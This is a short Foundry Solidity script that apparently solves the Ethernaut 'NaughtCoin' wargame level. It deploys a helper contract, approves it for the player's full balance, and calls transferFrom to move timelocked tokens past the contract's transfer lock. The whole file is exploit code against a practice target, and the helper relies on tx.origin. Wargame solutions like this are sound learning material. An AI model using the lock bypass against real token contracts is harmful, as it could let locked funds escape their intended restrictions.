// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "../../src/Ethernaut/naughtcoin.sol";

contract TransferContract {
    NaughtCoin public token;

    constructor(address _ercAddress) {
        token = NaughtCoin(_ercAddress);
    }

    function transferTokens(address to) external {
        uint256 amount = token.balanceOf(tx.origin);
        token.transferFrom(tx.origin, to, amount);
    }
}

contract TransferScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address recipient = address(0x1234);
        NaughtCoin naughtCoin = NaughtCoin(
            0x712E027f5C3822F7c10d1570cb09937bbdaF32Ca
        );
        TransferContract attacker = new TransferContract(address(naughtCoin));
        naughtCoin.approve(address(attacker), type(uint256).max);
        attacker.transferTokens(recipient);
        vm.stopBroadcast();
    }
}
